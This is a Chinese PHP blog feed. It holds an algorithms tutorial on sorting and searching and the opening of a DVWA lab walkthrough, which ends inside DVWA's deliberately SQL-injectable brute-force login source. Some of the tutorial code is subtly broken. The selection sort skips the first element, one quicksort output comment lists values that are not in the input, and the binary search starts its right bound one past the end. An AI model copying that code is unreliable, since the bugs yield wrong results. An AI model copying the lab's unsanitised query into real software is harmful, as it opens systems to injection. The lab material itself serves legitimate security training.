<p>冒泡排序的算法思路：</p>
<p>​    1、比较相邻的元素。如果第一个比第二个大，就交换他们两个。</p>
<p>​    2、对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该回事最大的数。</p>
<p>​    3、针对所有元素重复以上步骤，除了最后一个。</p>
<p>​    4、持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组排序算法：冒泡排序</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">8</span>);</span><br><span class="line"><span class="comment">//2、想办法让下面可以每次找出最大值的代码重复执行</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>,<span class="variable">$len</span> = count(<span class="variable">$arr</span>);<span class="variable">$i</span> &lt; <span class="variable">$len</span> - <span class="number">1</span>;<span class="variable">$i</span>++,<span class="variable">$len</span>--)&#123;</span><br><span class="line">    <span class="comment">//1、想办法将最大的值放到最右边去</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="variable">$len</span> - <span class="number">1</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">    	<span class="comment">//判断：两两相比</span></span><br><span class="line">    	<span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="variable">$j</span>] &gt; <span class="variable">$arr</span>[<span class="variable">$j</span>+<span class="number">1</span>])&#123;</span><br><span class="line">        	<span class="comment">//左边比右边大：交换</span></span><br><span class="line">        	<span class="variable">$temp</span> = <span class="variable">$arr</span>[<span class="variable">$j</span>];</span><br><span class="line">        	<span class="variable">$arr</span>[<span class="variable">$j</span>] = <span class="variable">$arr</span>[<span class="variable">$j</span>+<span class="number">1</span>];</span><br><span class="line">        	<span class="variable">$arr</span>[<span class="variable">$j</span>+<span class="number">1</span>] = <span class="variable">$temp</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);		<span class="comment">//Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 4 [3] =&gt; 5 [4] =&gt; 7 [5] =&gt; 8 [6] =&gt; 9 )</span></span><br></pre></td></tr></table></figure>


<h4 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h4><p>选择排序（selection sort）是一种简单直观的排序算法。他的工作原理是每一次从待排序的数据元素中选出最小（或最大）的一个元素，存放在序列的起始位置，直到全部待排序的数据元素排完。选择排序是不稳定的排序方法（比如序列[5,5,3]第一次就将第一个[5]与[3]交换，导致第一个5挪动到第二个5后面）。</p>
<p>选择排序的思路：</p>
<p>​    1、假设第一个元素为最小元素，记下下标。</p>
<p>​    2、寻找右侧剩余的元素，如果有更小的，重新记下最新的下标。</p>
<p>​    3、如果又新的最小的，交换两个元素。</p>
<p>​    4、往右重复以上步骤，直到元素本身为最后一个。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组排序算法：选择排序</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="comment">//1、确定要交换多少次：一次只能找到最小的，需要找到数组长度对应的次数</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>,<span class="variable">$len</span> = count(<span class="variable">$arr</span>);<span class="variable">$i</span> &lt; <span class="variable">$len</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="comment">//2、假设当前第一个已经排好序了</span></span><br><span class="line">    <span class="variable">$min</span> = <span class="variable">$i</span>;</span><br><span class="line">    <span class="comment">//3、拿该最小的取比较剩余的其他</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$i</span>+<span class="number">1</span>;<span class="variable">$j</span> &lt; <span class="variable">$len</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="comment">//4、比较：比较当前元素与选定的最小元素</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="variable">$j</span>] &lt; <span class="variable">$arr</span>[<span class="variable">$min</span>])&#123;</span><br><span class="line">            <span class="comment">//说明当前指定的$min不合适</span></span><br><span class="line">            <span class="variable">$min</span> = <span class="variable">$j</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//5、交换当前选定的值与实际最小的元素值</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$min</span> != <span class="variable">$i</span>)&#123;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$arr</span>[<span class="variable">$i</span>] = <span class="variable">$arr</span>[<span class="variable">$min</span>];</span><br><span class="line">        <span class="variable">$arr</span>[<span class="variable">$min</span>] = <span class="variable">$temp</span>;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);		<span class="comment">//Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4 [4] =&gt; 5 [5] =&gt; 6 [6] =&gt; 9 )</span></span><br></pre></td></tr></table></figure>


<h4 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h4><p>插入排序（insert sort），插入排序的基本操作就是将一个数据插入到已经排好序的有序数据中，从而得到一个新的、个数加一的有序数据，算法适用于少量数据的排序，是稳定的排序方法。插入算法把要排序的数组分为两部分：第一部分包含了这个数组的所有元素，但将最后一个元素除外（让数组多一个空间才有插入的位置），而第二部分就只包含这一个元素（即待插入元素）。在第一部分排序完成后，再将这个最后元素插入到已排好序的第一部分中。</p>
<p>插入排序的基本思想是：每步将一个待排序的记录，按其关键码值的大小插入前面已经排序的文件中适当的位置上，直到全部插入完为止。</p>
<p>插入排序的算法思路：</p>
<p>​    1、设置监视哨r[0]，将待插入记录的值赋值给r[0]；</p>
<p>​    2、设置开始查找的位置j</p>
<p>​    3、再数组中进行搜索，搜索中将第j个记录后移，直至r[0].key &gt;= r[j].key为止；</p>
<p>​    4、讲r[0]插入r[j+1]的位置上</p>
<p>通俗来讲：</p>
<p>​    1、认定第一个元素已经排好序</p>
<p>​    2、取出第二个元素，作为待插入数据</p>
<p>​    3、与已经排好序的数组的最右侧元素开始比较</p>
<p>​    4、如果后面的小于前面的：说明前面已经排好序的那个数组元素不再对的位置（向后移一个），然后让新的元素填充进去（继续向前比：高级）</p>
<p>​    5、重复前面的步骤：直到当前元素插入到对的位置</p>
<p>​    6、重复以上步骤，直到所有的数组元素都插入到对的位置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组排序：插入排序</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">5</span>);</span><br><span class="line"><span class="comment">//1、确定要插入多少回（假设一个数字一次性插入到对的位置，同时第一个位置是假设对的）</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>,<span class="variable">$len</span> = count(<span class="variable">$arr</span>);<span class="variable">$i</span> &lt; <span class="variable">$len</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="comment">//2、取出当前要插入的元素的值</span></span><br><span class="line">    <span class="variable">$temp</span> = <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="comment">//3、让该数据与前面已经拍好序的数组元素重复比较（挨个比较），直到对的位置（交换）</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$i</span> - <span class="number">1</span>;<span class="variable">$j</span> &gt;= <span class="number">0</span>;<span class="variable">$j</span>--)&#123;</span><br><span class="line">        <span class="comment">//4、比较</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="variable">$j</span>] &gt; <span class="variable">$temp</span>)&#123;</span><br><span class="line">            <span class="comment">//说明当前要插入的元素，比前面的已经排好序的元素的值要小：交换位置</span></span><br><span class="line">            <span class="variable">$arr</span>[<span class="variable">$j</span>+<span class="number">1</span>] = <span class="variable">$arr</span>[<span class="variable">$j</span>];</span><br><span class="line">            <span class="variable">$arr</span>[<span class="variable">$j</span>] = <span class="variable">$temp</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//说明当前待插入元素，比前面的元素要大：说明位置正确</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);		<span class="comment">//Array ( [0] =&gt; 2 [1] =&gt; 4 [2] =&gt; 5 [3] =&gt; 6 [4] =&gt; 8 [5] =&gt; 9 )</span></span><br></pre></td></tr></table></figure>
<p>优化代码：找到对的位置交换一次即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组排序：插入排序（优化）</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">5</span>);</span><br><span class="line"><span class="comment">//1、确定要插入多少回（假设一个数字一次性插入到对的位置，同时第一个位置是假设对的）</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>,<span class="variable">$len</span> = count(<span class="variable">$arr</span>);<span class="variable">$i</span> &lt; <span class="variable">$len</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="comment">//2、取出当前要插入的元素的值</span></span><br><span class="line">    <span class="variable">$temp</span> = <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$change</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">//3、让该数据与前面已经拍好序的数组元素重复比较（挨个比较），直到对的位置（交换）</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$i</span> - <span class="number">1</span>;<span class="variable">$j</span> &gt;= <span class="number">0</span>;<span class="variable">$j</span>--)&#123;</span><br><span class="line">        <span class="comment">//4、比较</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="variable">$j</span>] &gt; <span class="variable">$temp</span>)&#123;</span><br><span class="line">            <span class="comment">//说明当前要插入的元素，比前面的已经排好序的元素的值要小：交换位置</span></span><br><span class="line">            <span class="variable">$arr</span>[<span class="variable">$j</span>+<span class="number">1</span>] = <span class="variable">$arr</span>[<span class="variable">$j</span>];</span><br><span class="line">            <span class="comment">//说明前面要插入的元素，比前面已经排好序的元素的值要小：交换位置</span></span><br><span class="line">            <span class="variable">$change</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//说明当前待插入元素，比前面的元素要大：说明位置正确</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断位置需要变动</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$change</span>)&#123;</span><br><span class="line">        <span class="comment">//有数据移动：占错位置了</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="variable">$j</span>+<span class="number">1</span>] = <span class="variable">$temp</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);		<span class="comment">//Array ( [0] =&gt; 2 [1] =&gt; 4 [2] =&gt; 5 [3] =&gt; 6 [4] =&gt; 8 [5] =&gt; 9 )</span></span><br></pre></td></tr></table></figure>


<h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><p>快速排序（quick sort）是对冒泡排序的一种改进。通过一趟排序将要排序的数据分隔成独立的两部分，其中一部分的所有数据都比另一部分的所有数据都要小，然后再按次方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。（递归）</p>
<p>设要排序的数组是A[0]……A[N-1]，首先任意选取一个数据（通常选用数组的第一个数）作为关键数据，然后将所有比它小的数据都放到它前面，所有比它大的数据都放到它后面，这个过程称为一趟快速排序。值得注意的是，快速排序不是一种稳定的排序算法，也就是说，多个相同的值的相对位置也许会再算法结束时产生变动。</p>
<p>快速排序的算法是：</p>
<p>​    1、从数组中选出一个元素（通常第一个），作为参照对象。</p>
<p>​    2、定义两个数组，将目标数组中剩余的元素与参照元素挨个比较：小的放到一个数组，大的放到另外一个数组。</p>
<p>​    3、第二步执行完之后，前后的数组顺序不确定，但是确定了自己的位置。</p>
<p>​    4、将得到的小数组按照第1到第3步重复操作（子问题）。</p>
<p>​    5、回溯最小数组（一个元素）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组排序：快速排序</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">8</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quick_sort</span>(<span class="params"><span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//递归出口</span></span><br><span class="line">    <span class="variable">$len</span> = count(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$len</span> &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="variable">$arr</span>;</span><br><span class="line">    <span class="comment">//取出某个元素，然后将剩余的数组元素，分散到两个不同的数组中</span></span><br><span class="line">    <span class="variable">$left</span> = <span class="variable">$right</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>;<span class="variable">$i</span> &lt; <span class="variable">$len</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="comment">//第一个元素作为比较元素</span></span><br><span class="line">        <span class="comment">//比较：小的放left中，大的放right中</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="variable">$i</span>] &lt; <span class="variable">$arr</span>[<span class="number">0</span>])&#123;</span><br><span class="line">            <span class="variable">$left</span>[] = <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$right</span>[] = <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//$left和$right数组元素没有排好序：递归点</span></span><br><span class="line">    <span class="variable">$left</span> = quick_sort(<span class="variable">$left</span>);</span><br><span class="line">    <span class="variable">$right</span> = quick_sort(<span class="variable">$right</span>);</span><br><span class="line">    <span class="comment">//合并三个“数”组</span></span><br><span class="line">    <span class="keyword">return</span> array_merge(<span class="variable">$left</span>,(<span class="keyword">array</span>)<span class="variable">$arr</span>[<span class="number">0</span>],<span class="variable">$right</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(quick_sort(<span class="variable">$arr</span>));		<span class="comment">//Array ( [0] =&gt; 2 [1] =&gt; 3 [2] =&gt; 4 [3] =&gt; 5 [4] =&gt; 6 [5] =&gt; 7 [6] =&gt; 8 [7] =&gt; 9 )</span></span><br></pre></td></tr></table></figure>


<h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><p>归并排序（merge sort）是建立在归并操作上的一种有效的排序算法，该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为二路归并。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//二路归并</span></span><br><span class="line"><span class="variable">$arr1</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>);</span><br><span class="line"><span class="variable">$arr2</span> = <span class="keyword">array</span>(<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>);</span><br><span class="line"><span class="comment">//取出一个空数组用于归并空间</span></span><br><span class="line"><span class="variable">$arr3</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">while</span>(count(<span class="variable">$arr1</span>) &amp;&amp; count(<span class="variable">$arr2</span>))&#123;</span><br><span class="line">    <span class="comment">//只要$arr1和$arr2里面还有元素，就进行循环</span></span><br><span class="line">    <span class="comment">//取出每个数组的第一个元素：进行比较</span></span><br><span class="line">    <span class="variable">$arr3</span>[] = <span class="variable">$arr1</span>[<span class="number">0</span>] &lt; <span class="variable">$arr2</span>[<span class="number">0</span>] ? array_shift(<span class="variable">$arr1</span>) :array_shift(<span class="variable">$arr2</span>);    &#125;</span><br><span class="line"><span class="comment">//合并结果</span></span><br><span class="line">print_r(array_merge(<span class="variable">$arr3</span>,<span class="variable">$arr1</span>,<span class="variable">$arr2</span>));</span><br></pre></td></tr></table></figure>
<p>归并排序的算法是：</p>
<p>​    1、将数组拆分成两个数组</p>
<p>​    2、重复步骤1将数组拆分成最小单元</p>
<p>​    3、申请空间，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列。</p>
<p>​    4、设定两个指针，最初位置分别为两个已经排序序列的起始位置。</p>
<p>​    5、比较两个指针所所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置</p>
<p>​    6、重复步骤3直到某一指针超出序列尾</p>
<p>​    7、将另一序列所剩下的所有元素直接赋值到合并序列尾</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">3</span>);</span><br><span class="line"><span class="comment">//数组排序：归并排序</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge_sort</span>(<span class="params"><span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//递归出口</span></span><br><span class="line">    <span class="variable">$len</span> = count(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$len</span> &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="variable">$arr</span>;</span><br><span class="line">    <span class="comment">//拆分</span></span><br><span class="line">    <span class="variable">$middle</span> = floor(<span class="variable">$len</span> / <span class="number">2</span>);</span><br><span class="line">    <span class="variable">$left</span> = array_slice(<span class="variable">$arr</span>,<span class="number">0</span>,<span class="variable">$middle</span>);</span><br><span class="line">	<span class="variable">$right</span> = array_slice(<span class="variable">$arr</span>,<span class="variable">$middle</span>);</span><br><span class="line">    <span class="comment">//递归点：$left和$right都没有排好序：而且可能是多个元素的数组</span></span><br><span class="line">    <span class="variable">$left</span> = merge_sort(<span class="variable">$left</span>);</span><br><span class="line">    <span class="variable">$right</span> = merge_sort(<span class="variable">$right</span>);</span><br><span class="line">    <span class="comment">//假设左边和右边都已经排好序：二路归并</span></span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">while</span>(count(<span class="variable">$left</span>) &amp;&amp; count(<span class="variable">$right</span>))&#123;</span><br><span class="line">    	<span class="comment">//只要$arr1和$arr2里面还有元素，就进行循环</span></span><br><span class="line">    	<span class="comment">//取出每个数组的第一个元素：进行比较</span></span><br><span class="line">    	<span class="variable">$m</span>[] = <span class="variable">$left</span>[<span class="number">0</span>] &lt; <span class="variable">$right</span>[<span class="number">0</span>] ? array_shift(<span class="variable">$left</span>) :array_shift(<span class="variable">$right</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//返回结果</span></span><br><span class="line">    <span class="keyword">return</span> array_merge(<span class="variable">$m</span>,<span class="variable">$left</span>,<span class="variable">$right</span>);		<span class="comment">//Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4 [4] =&gt; 5 [5] =&gt; 7 [6] =&gt; 9 )</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="查找算法"><a href="#查找算法" class="headerlink" title="查找算法"></a>查找算法</h3><h4 id="查找算法含义"><a href="#查找算法含义" class="headerlink" title="查找算法含义"></a>查找算法含义</h4><p>查找实在大量的信息中寻找一个特定的信息元素，再计算机应用中，查找是基本运算。查找算法是指实现查找过程对应的代码结。就是在大型数组中取快速定位到想要的元素。</p>
<h4 id="顺序查找算法"><a href="#顺序查找算法" class="headerlink" title="顺序查找算法"></a>顺序查找算法</h4><p>顺序查找也称为线形查找，从数据结构线形表的一端开始，顺序扫描，一次将扫描到的结点关键字与给定值k相比较，若相等则表示查找成功，若扫描结束仍然没有找到关键字等于k的结点，表示查找失败。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查找算法：顺序查找</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">23</span>,<span class="number">68</span>,<span class="number">100</span>);</span><br><span class="line"><span class="comment">//顺序查找：从数组第一个元素开始，挨个匹配</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_order</span>(<span class="params"><span class="variable">$arr</span>,<span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//全部匹配</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>,<span class="variable">$len</span> = count(<span class="variable">$arr</span>);<span class="variable">$i</span> &lt; <span class="variable">$len</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="comment">//判断</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="variable">$i</span>] == <span class="variable">$num</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$i</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(check_order(<span class="variable">$arr</span>,<span class="number">5</span>));		<span class="comment">//bool(false)</span></span><br></pre></td></tr></table></figure>


<h4 id="二分查找算法"><a href="#二分查找算法" class="headerlink" title="二分查找算法"></a>二分查找算法</h4><p>二分查找算法要求线形表中的结点按关键字值升序或者降序排列，用给定值k与中间结点的关键字比较，中间结点把线形表分成两个子表，若相等则查找成功；若不相等，再根据k与该中间结点关键字的比较结果确定下一步查找哪个子表，这样递归进行，直到查找到或查找结束。</p>
<p>折半算法思路：</p>
<p>​    1、计算数组长度</p>
<p>​    2、确定左右两边的指针位置</p>
<p>​    3、找到中间位置</p>
<p>​    4、匹配</p>
<p>​    5、然后根据大小重定边界</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查找算法：二分查找算法</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">23</span>,<span class="number">68</span>,<span class="number">100</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_break</span>(<span class="params"><span class="variable">$arr</span>,<span class="variable">$res</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//1、得到数组的边界</span></span><br><span class="line">    <span class="variable">$right</span> = count(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="variable">$left</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//循环匹配</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$left</span> &lt;= <span class="variable">$right</span>)&#123;</span><br><span class="line">        <span class="comment">//3、得到中间位置</span></span><br><span class="line">        <span class="variable">$middle</span> = floor((<span class="variable">$left</span> + <span class="variable">$right</span>) / <span class="number">2</span>);</span><br><span class="line">        <span class="comment">//4、匹配数据</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="variable">$middle</span>] == <span class="variable">$res</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$middle</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//5、没有找到</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="variable">$middle</span>] &lt;= <span class="variable">$res</span>)&#123;</span><br><span class="line">            <span class="comment">//值在右边</span></span><br><span class="line">            <span class="variable">$left</span> = <span class="variable">$middle</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//值在左边</span></span><br><span class="line">            <span class="variable">$right</span> = <span class="variable">$middle</span> - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(check_break(<span class="variable">$arr</span>,<span class="number">100</span>));		<span class="comment">//float(6)</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA全攻略</title>
    <url>/2021/02/27/DVWA%E5%85%A8%E6%94%BB%E7%95%A5/</url>
    <content><![CDATA[<h2 id="部署DVWA"><a href="#部署DVWA" class="headerlink" title="部署DVWA"></a>部署DVWA</h2><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#下载vulnerables&#x2F;web-dvwa镜像</span><br><span class="line">docker pull vulnerables&#x2F;web-dvwa;</span><br><span class="line">#运行镜像启动容器</span><br><span class="line">docker run --rm -it -p 80:80 vulnerables&#x2F;web-dvwa</span><br></pre></td></tr></table></figure>
<p>然后浏览器访问<a class="link"   href="http://localhost/setup.php%E5%8D%B3%E5%8F%AF%E8%AE%BF%E9%97%AE" >http://localhost/setup.php即可访问<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="VMWare"><a href="#VMWare" class="headerlink" title="VMWare"></a>VMWare</h3><p>首先安装phpstudy，配置环境，把php参数中的最后一项<code>allow_url_include</code>打开</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210227104424051.png" alt="image-20210227104424051"></p>
<p>把从官网下载来的DVWA文件放到phpsyudy的WWW目录下，进入DVWA/config目录，把config.inc.php.dist后面的dist去掉</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210227103710143.png" alt="image-20210227103710143"></p>
<p>然后打开文件，修改框中的内容为如图所示，保存</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210227104154571.png" alt="image-20210227104154571"></p>
<h2 id="Brute-Force-暴力破解"><a href="#Brute-Force-暴力破解" class="headerlink" title="Brute Force 暴力破解"></a>Brute Force 暴力破解</h2><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span 